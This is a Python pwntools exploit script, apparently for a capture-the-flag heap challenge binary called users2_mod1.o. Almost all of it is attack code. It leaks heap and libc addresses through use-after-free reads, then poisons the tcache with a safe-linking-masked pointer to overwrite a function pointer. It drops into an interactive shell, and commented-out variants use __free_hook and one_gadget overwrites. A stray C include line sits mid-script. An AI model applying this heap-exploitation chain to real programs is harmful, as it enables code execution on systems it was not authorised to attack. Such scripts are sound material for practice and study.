import struct
from pwn import *

elf = ELF('./users2_mod1.o')
p = process('./users2_mod1.o')
# p = remote('localhost', 5555)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# secret_addr = p.recvuntil("\n").decode("utf-8").split("The libc is at ")[-1]
# libc_base = secret_addr[:-1]

# log.info("libc_addr:",libc_base)
# libc_base = int(libc_base,16)
# hook = libc_base + int(hex(libc.symbols["__free_hook"]), 16)
# one_gadget = libc_base + 0x4f302 # 0x10a2fc #0x4f302 0x4f2a5

#cmd_ = ["a", "1", "1", "a", "1", "1", "a", "1", "1", "a", "1", "1", "a", "1", "1", "a", "1", "1", "a", "1", "1", "a", "1", "1", "a", "1", "1", "a", "1", "1", "r", "1", "r", "2", "r", "3", "r", "4", "r", "5", "r", "6", "r", "7", "r", "10", "r", "9", "r", "8", "a", "1", "1", "a", "1", "1", "a", "1", "1", "a", "1", "1", "a", "1", "1", "a", "1", "1", "a", "1", "1", "a", b"A" * 32 + struct.pack("Q",hook), "3", "a", "1", "1", "a", "1", "1", "a", struct.pack("Q", one_gadget), "1", "r", "1"]
# cmd_ = ["a", "1", "1", "a", "1", "1", "a", "1", "1", "a", "1", "1", "a", "1", "1", "a", "1", "1", "a", "1", "1", "a", "1", "1", "a", "1", "1", "a", "1", "1", "r", "1", "r", "2", "r", "3", "r", "4", "r", "5", "r", "6", "r", "7", "r", "10", "r", "9", "r", "8", "a", "1", "1", "a", "1", "1", "a", "1", "1", "a", "1", "1", "a", "1", "1", "a", "1", "1", "a", "1", "1", "a", b"A" * 32 + struct.pack("Q",hook), "3", "a", "1", "1", "a", "1", "1", "a", struct.pack("Q", one_gadget), "1", "r", "1", "cat flag.txt"]

# cmd_ = ["a\nA\n1\n" * ]
print(p.recv().decode("utf-8"))

def add_user(size):
    p.sendline("a\n"+str(size)+"\nA")
    try:
        (p.recv().decode("utf-8"))
    except:	pass

def remove_user(no):
    p.sendline("r\n"+str(no))
    try:
        (p.recv().decode("utf-8"))
    except:	pass

def add_exploit(size, input_data):
    # exploit = "\x00" * 24 + "\xa1" #+ "\x00" * 4
    p.sendline("a")
    p.sendline(str(size))
    p.sendline(input_data)
    # p.sendline("1")
    try:
        (p.recv().decode("utf-8"))
    except:	pass

for i in range (1, 10):
    add_user(255)
# add_exploit(8, b"/bin/sh\0")
add_user(30) #Padding for HoB

# remove_user(1)

# p.sendline(b"p")
# addr_leak = p.recvline().strip()
# print(addr_leak)
# addr_leak = addr_leak.split()[1]
# # addr_leak = addr_leak[:-6]
# # print(len(addr_leak.strip()))
# heap_base = u64(addr_leak + b'\x00'*(8-len(addr_leak)))
# log.info("heap_base:", hex(heap_base))


remove_user(1)

p.sendline(b"p")
addr_leak = p.recv().split(b"\n")
# print(addr_leak[0]).h>
#include <link.h>
# print(addr_leak)
heap_leak = addr_leak[0].split()[1]
# addr_leak = addr_leak[:-6]
# print(len(addr_leak.strip()))
heap_leak += b'\x00'*(8-len(heap_leak))
heap_base = (u64(heap_leak) << 12)# - 0x1000
log.info("heap:" + hex(heap_base))

for i in range(2, 8):
    remove_user(i)

# pid = gdb.attach(p, gdbscript='''heap bins''')

remove_user(9)
remove_user(8)
# pid = gdb.attach(p, gdbscript='''heap bins''')

# remove_user(8)
# for i in range(0, 20):
#     add_exploit()

# for i in range(0, 10):
#     remove_user(i)

# # remove_user(10)
# # remove_user(11)
# add_user()
# add_user()
# add_user()
# add_user()
# add_user()
# add_user()
# for i in range(0, ):
#     add_user()


p.sendline(b"p")
addr_leak = p.recv().split(b"\n")
print(addr_leak)
# for each in addr_leak:
#     try:
#         libc_leak = each.split()[1]
#         libc_leak += b'\x00'*(8-len(libc_leak))
#         libc_base = u64(libc_leak) - 0x219ce0
#         log.info("libc:" + hex(libc_base))
#     except:
#         pass
libc_leak = addr_leak[7].split()[1]
# addr_leak = addr_leak[:-6]
# print(len(addr_leak.strip()))
libc_leak += b'\x00'*(8-len(libc_leak))
# print(libc.symbols["main_arena"])
libc_base = u64(libc_leak) - 0x219ce0
log.info("libc:" + hex(libc_base))
# try:
#     print(p.recv())
# except:	pass
# print(libc.symbols)
free_pointer = 0x00404060
# print("PLT free?", hex(free_pointer))

# remove_user(9)
# pid = gdb.attach(p, gdbscript='''heap bins''')
add_user(255)
# exploit_addr = 0x50a37
# exploit_addr = 0xebcf1  
# exploit_addr = 0xebcf5
# exploit_addr = 0xebcf8
exploit_addr = 0x4013b5
# stdout = libc.address + 0x21a780
log.info("Exploit:" + hex(libc_base + exploit_addr))

remove_user(9)
# pid = gdb.attach(p, gdbscript='''info proc mappings''')
# pid = gdb.attach(p, gdbscript='''heap bins''')
add_exploit(288, b"T"*0x108 + p64(0x111) + p64((free_pointer ^ ((heap_base + 0xa10) >> 12))))
# add_user(288)
# pid = gdb.attach(p, gdbscript='''heap bins''')
# print("Hi")

add_user(255)
# add_user(255)

pid = gdb.attach(p, gdbscript='''heap bins''')
# add_user(255)
# add_exploit(255, "ABCDEFGHIJKLMNOPQRSTUVWXYZ")
# pid = gdb.attach(p, gdbscript='''heap bins''')
add_exploit(255, p64(exploit_addr))
# pid = gdb.attach(p, gdbscript='''heap bins''')
# add_user(32)
# add_exploit(255, p64(libc_base + ))
# try:
#     (p.recv())
# except:	pass
# p.recv()
# p.sendline('p')
# p.sendline("ls")
# print(p.recv())
# p.clean()
p.interactive()

# add_exploit(255, hex(libc_base + 0xebcf1))
# add_exploit(255, hex(libc_base + 0xebcf5))
# add_exploit(255, hex(libc_base + 0xebcf8))
# addr_leak = p.recv().split(b"\n")
# print(addr_leak)
# pid = gdb.attach(p, gdbscript='''heap bins''')
# libc_leak = addr_leak[0].split()[1]
# # addr_leak = addr_leak[:-6]
# # print(len(addr_leak.strip()))
# libc_leak += b'\x00'*(8-len(libc_leak))
# libc_base = u64(libc_leak) - 0x219ce0
# log.info("libc:" + hex(libc_base))

# printf = (libc.symbols["printf"])

# for i in range (9, 19):
#     add_user(16)

# for i in range(9, 19):
#     remove_user(i)

# remove_user(18)
# pid = gdb.attach(p, gdbscript='''info proc mappings''')
# for i in range (9, 16):
#     add_user(16)
# add_exploit(16, hex(libc_base + printf_pointer))
# add_user(16)
# add_user(16)
# add_exploit(16, hex(libc_base + 0x50a37))

# print("x\n")

# for cmd in cmd_:
#     p.sendline(cmd)
#     print(cmd, "\n")
    # try:
    #     print(p.recv().decode("utf-8"))
    # except:	pass


